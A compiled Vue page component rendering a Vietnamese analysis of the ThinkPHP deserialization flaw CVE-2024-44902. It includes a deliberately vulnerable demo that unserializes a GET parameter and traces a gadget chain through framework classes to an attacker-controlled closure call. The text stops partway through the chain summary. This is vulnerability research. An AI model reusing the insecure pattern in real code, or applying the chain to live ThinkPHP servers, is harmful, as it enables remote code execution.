import { _ as _export_sfc, r as resolveComponent, c as createElementBlock, e as createBaseVNode, f as createTextVNode, b as createVNode, a as createStaticVNode, o as openBlock } from "./app-BJjiZhLy.js";
const _imports_0 = "/assets/CVE-2024-44902-BRMeZhFe.png";
const _sfc_main = {};
const _hoisted_1 = {
  href: "https://github.com/advisories/GHSA-f4wh-359g-4pq7",
  target: "_blank",
  rel: "noopener noreferrer"
};
const _hoisted_2 = {
  href: "https://github.com/fru1ts/CVE-2024-44902",
  target: "_blank",
  rel: "noopener noreferrer"
};
function _sfc_render(_ctx, _cache) {
  const _component_ExternalLinkIcon = resolveComponent("ExternalLinkIcon");
  return openBlock(), createElementBlock("div", null, [
    _cache[2] || (_cache[2] = createBaseVNode("h2", {
      id: "overview",
      tabindex: "-1"
    }, [
      createBaseVNode("a", {
        class: "header-anchor",
        href: "#overview"
      }, [
        createBaseVNode("span", null, "Overview")
      ])
    ], -1)),
    _cache[3] || (_cache[3] = createBaseVNode("p", null, [
      createBaseVNode("strong", null, "ThinkPHP deserialization vulnerability"),
      createTextVNode(" A deserialization vulnerability in Thinkphp v6.1.3 to v8.0.4 allows attackers to execute arbitrary code.")
    ], -1)),
    createBaseVNode("p", null, [
      createBaseVNode("a", _hoisted_1, [
        _cache[0] || (_cache[0] = createBaseVNode("em", null, "https://github.com/advisories/GHSA-f4wh-359g-4pq7", -1)),
        createVNode(_component_ExternalLinkIcon)
      ])
    ]),
    _cache[4] || (_cache[4] = createStaticVNode('<h2 id="php-deserialize" tabindex="-1"><a class="header-anchor" href="#php-deserialize"><span>PHP Deserialize</span></a></h2><p>Qua mô tả có thể thấy thư viện này bị lỗi cho phép chạy bất kì code khi sử dụng hàm <code>unserialize()</code> mà không kiểm tra user input. Mình sẽ dựng lại server với hàm <code>unserialize()</code> được control bởi user input.</p><div class="language-php line-numbers-mode" data-highlighter="prismjs" data-ext="php" data-title="php"><pre><code><span class="line"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">{</span></span>\n<span class="line">        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;x&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">        <span class="token keyword">return</span> <span class="token string single-quoted-string">&#39;Indox&#39;</span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Trong PHP, khi gọi hàm <code>unserialize()</code> một Object class, sẽ có Magic method được tự động gọi đến, là <code>__wakeup()</code> hoặc <code>__unserialize()</code>, hoặc cũng có thể là <code>__destruct()</code> bởi Object đã được gọi xong và Garbage collector gọi đến. Dựa vào đây mình sẽ tìm các hàm ở trên để xem Class nào có thể khai thác khi deserialize. <img src="' + _imports_0 + '" alt="alt text"> Có khá ít nên có thể đọc từng cái để xem code làm những gì, các Class khác đều đi vào ngõ cụt và chỉ còn Class <code>ResourceRegister</code> có thể khai thác.</p><div class="language-php line-numbers-mode" data-highlighter="prismjs" data-ext="php" data-title="php"><pre><code><span class="line">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">{</span></span>\n<span class="line">        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">registered</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">        <span class="token punctuation">}</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Code sẽ check nếu chưa được regsiter thì tiếp tục gọi đến <code>ResourceRegister::register()</code></p><div class="language-php= line-numbers-mode" data-highlighter="prismjs" data-ext="php=" data-title="php="><pre><code><span class="line">    protected function register()</span>\n<span class="line">    {</span>\n<span class="line">        $this-&gt;registered = true;</span>\n<span class="line">        </span>\n<span class="line">        $this-&gt;resource-&gt;parseGroupRule($this-&gt;resource-&gt;getRule());</span>\n<span class="line">    }</span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Hàm này gọi đến <code>resource-&gt;parseGroupRule()</code>, ở đây mình có thể control được <code>$this-&gt;resource</code> khi khởi tạo Class <code>ResourceRegister</code>, vậy mình có thể chỉnh nó thành một Class theo ý mình. Tuy có thể tùy chỉnh Class theo ý thích nhưng mình lại không tìm được Class nào có hàm <code>parseGroupRule()</code> mà mình có thể khai thác được.</p><p>PHP có một Magic method được gọi đến khi ta sử dụng một method không tồn tại trong class đó, đó là <code>__call()</code>. Thay vì tìm hàm <code>parseGroupRule()</code> ban đầu, mình sẽ chuyển qua tìm trong các hàm <code>__call()</code> của những class khác. Có class <code>DbManager</code> như sau</p><div class="language-php line-numbers-mode" data-highlighter="prismjs" data-ext="php" data-title="php"><pre><code><span class="line">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">{</span></span>\n<span class="line">        <span class="token keyword">return</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Hàm <code>__call()</code> trước khi chạy hàm <code>call_user_func_array</code> sẽ phải gọi đến hàm <code>DbManager::connect()</code> -&gt; <code>DbManager::instance()</code></p><div class="language-php line-numbers-mode" data-highlighter="prismjs" data-ext="php" data-title="php"><pre><code><span class="line">    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">instance</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token keyword type-hint">bool</span> <span class="token variable">$force</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">ConnectionInterface</span></span>\n<span class="line">    <span class="token punctuation">{</span></span>\n<span class="line">        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">            <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getConfig</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;default&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;mysql&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># $this-&gt;config[&#39;default&#39;]</span></span>\n<span class="line">        <span class="token punctuation">}</span></span>\n<span class="line">        </span>\n<span class="line">        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$force</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">instance</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">instance</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">createConnection</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">        <span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line">        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">instance</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Trước tiên code sẽ gọi đến <code>DbManager::getConfig()</code> để lấy ra <code>$this-&gt;config[$key]</code> mà ở đây $key là <code>default</code>. Sau đó gọi đến <code>DbManager::createConnection()</code></p><div class="language-php line-numbers-mode" data-highlighter="prismjs" data-ext="php" data-title="php"><pre><code><span class="line">    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">createConnection</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">ConnectionInterface</span></span>\n<span class="line">    <span class="token punctuation">{</span></span>\n<span class="line">        <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getConnectionConfig</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># $this-&gt;config[&#39;connections&#39;][$name]</span></span>\n<span class="line"></span>\n<span class="line">        <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;type&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;type&#39;</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">&#39;mysql&#39;</span><span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line">        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">str_contains</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;\\\\&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">            <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token variable">$type</span><span class="token punctuation">;</span></span>\n<span class="line">        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span></span>\n<span class="line">            <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;\\\\think\\\\db\\\\connector\\\\&#39;</span> <span class="token operator">.</span> <span class="token function">ucfirst</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">        <span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line">        <span class="token doc-comment comment">/** <span class="token keyword">@var</span> <span class="token class-name">ConnectionInterface</span> <span class="token parameter">$connection</span> */</span></span>\n<span class="line">        <span class="token variable">$connection</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$class</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">        <span class="token operator">...</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Biến <code>$connection</code> sẽ khởi tạo một class mới mà tên class này được lấy từ <code>$config[&#39;type&#39;]</code> với tham số là <code>$config</code>. Tất nhiên là 2 biến này mình đều có thể control được khi khởi tạo class <code>DbManager</code>.</p><p>Khi khởi tạo một class mới, PHP sẽ gọi đến Magic method <code>__construct()</code> để khởi tạo cho hàm đó theo param truyền vào. Lúc này chuyển hướng qua tìm các hàm <code>__construct()</code> của các class khác. Vì bất kì class nào cũng đều định nghĩa hàm <code>__construct()</code> nên có khá nhiều class để tìm, có class <code>Memcached</code> như sau</p><div class="language-php line-numbers-mode" data-highlighter="prismjs" data-ext="php" data-title="php"><pre><code><span class="line">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">{</span></span>\n<span class="line">        <span class="token operator">...</span></span>\n<span class="line">        </span>\n<span class="line">        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">        <span class="token punctuation">}</span></span>\n<span class="line">        </span>\n<span class="line">        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\\</span>Memcached</span><span class="token punctuation">;</span></span>\n<span class="line">        </span>\n<span class="line">        <span class="token operator">...</span></span>\n<span class="line">        </span>\n<span class="line">        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;&#39;</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;username&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">handler</span><span class="token operator">-&gt;</span><span class="token function">setOption</span><span class="token punctuation">(</span><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\\</span>Memcached</span><span class="token operator">::</span><span class="token constant">OPT_BINARY_PROTOCOL</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">handler</span><span class="token operator">-&gt;</span><span class="token function">setSaslAuthData</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;username&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;password&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">        <span class="token punctuation">}</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Trước tiên code sẽ merge <code>$options</code> được truyền vào với biến <code>$this-&gt;options</code> có sẵn, sau đó sẽ so sánh <code>&#39;&#39; != $this-&gt;options[&#39;username&#39;]</code>. Thoạt nhìn có vẻ bình thường nhưng lại tiếp tục là một Magic method nữa được gọi. Nếu như biến <code>$this-&gt;options[&#39;username&#39;]</code> không phải là một string thì PHP sẽ cố để ép kiểu nó qua string để có thể so sánh. Khi so sánh, PHP sẽ gọi đến hàm <code>__toString()</code> nếu nó được định nghĩa trong object. Mình lại tiếp tục tìm các class có hàm <code>__toString()</code>. Có class <code>Pivot</code> được kế thừa từ abstract class <code>Models</code> sẽ gọi đến <code>__toString()</code> -&gt; <code>toJson()</code> -&gt; <code>toArray()</code> như sau</p><div class="language-php line-numbers-mode" data-highlighter="prismjs" data-ext="php" data-title="php"><pre><code><span class="line">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span></span>\n<span class="line">    <span class="token punctuation">{</span></span>\n<span class="line">        <span class="token operator">...</span></span>\n<span class="line">        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">relation</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line">        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=&gt;</span> <span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">            <span class="token operator">...</span> </span>\n<span class="line">            <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$hidden</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token variable">$hasVisible</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">                <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getAttr</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">            <span class="token punctuation">}</span></span>\n<span class="line">            <span class="token operator">...</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Biến <code>$data</code> sẽ được merge từ <code>$this-&gt;data</code> và <code>$this-&gt;relation</code> sau đó loop qua các item của biến, tiếp tục gọi đến hàm <code>getAttr($key)</code></p><div class="language-php line-numbers-mode" data-highlighter="prismjs" data-ext="php" data-title="php"><pre><code><span class="line">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getAttr</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$name</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">{</span></span>\n<span class="line">        <span class="token keyword">try</span> <span class="token punctuation">{</span></span>\n<span class="line">            <span class="token variable">$relation</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></span>\n<span class="line">            <span class="token variable">$value</span>    <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvalidArgumentException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">            <span class="token variable">$relation</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">isRelationAttr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">            <span class="token variable">$value</span>    <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span></span>\n<span class="line">        <span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line">        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$relation</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Biến <code>$value</code> đơn giản là trả về giá trị của <code>$this-&gt;data[$fieldName]</code>, sau đó gọi đến hàm <code>getValue($name, $value)</code></p><div class="language-php line-numbers-mode" data-highlighter="prismjs" data-ext="php" data-title="php"><pre><code><span class="line">    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">getValue</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token keyword type-declaration">bool</span> <span class="token operator">|</span> <span class="token keyword type-declaration">string</span> <span class="token variable">$relation</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">{</span></span>\n<span class="line">        <span class="token variable">$fieldName</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getRealFieldName</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">        <span class="token operator">...</span></span>\n<span class="line">        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">withAttr</span><span class="token punctuation">[</span><span class="token variable">$fieldName</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">            <span class="token operator">...</span></span>\n<span class="line">            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$fieldName</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">json</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">withAttr</span><span class="token punctuation">[</span><span class="token variable">$fieldName</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">                <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getJsonValue</span><span class="token punctuation">(</span><span class="token variable">$fieldName</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">            <span class="token punctuation">}</span></span>\n<span class="line">            <span class="token operator">...</span></span>\n<span class="line">        <span class="token punctuation">}</span></span>\n<span class="line">        <span class="token operator">...</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Code sẽ kiểm tra một số điều kiện với <code>$this-&gt;withAttr</code> và <code>$this-&gt;json</code>, tuy nhiên 2 biến này ta có thể control nên không vấn đề gì, nếu thỏa thì code sẽ gọi đến <code>getJsonValue($fieldName, $value)</code></p><div class="language-php line-numbers-mode" data-highlighter="prismjs" data-ext="php" data-title="php"><pre><code><span class="line">    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">getJsonValue</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">{</span></span>\n<span class="line">        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">            <span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span></span>\n<span class="line">        <span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line">        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">withAttr</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=&gt;</span> <span class="token variable">$closure</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">jsonAssoc</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">                <span class="token variable">$value</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$closure</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">&#39;&#39;</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span>\n<span class="line">            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span></span>\n<span class="line">                <span class="token variable">$value</span><span class="token operator">-&gt;</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$closure</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">-&gt;</span><span class="token variable">$key</span> <span class="token operator">??</span> <span class="token string single-quoted-string">&#39;&#39;</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">            <span class="token punctuation">}</span></span>\n<span class="line">        <span class="token punctuation">}</span></span>\n<span class="line">        </span>\n<span class="line">        <span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Đến đây đã là điểm cuối của chain, có thể thấy khá rõ ràng <code>$value[$key]</code> được gán giá trị là return value của một hàm. Trong đó mình có thể tùy chỉnh <code>$closure</code> cũng như <code>$value[$key]</code> để có thể gọi hàm và param theo ý mình.</p><h3 id="tong-hop-lai-gadget-chain" tabindex="-1"><a class="header-anchor" href="#tong-hop-lai-gadget-chain"><span>Tổng hợp lại gadget chain</span></a></h3><p><code>ResourceRegister::__destruct()</code> -&gt; <code>ResourceRegister::register()</code> -&gt; <code>DbManager::__call()</code> -&gt; <code>DbManager::connect()</code> -&gt; <code>DbManager::instance($name, $force)</code> -&gt; 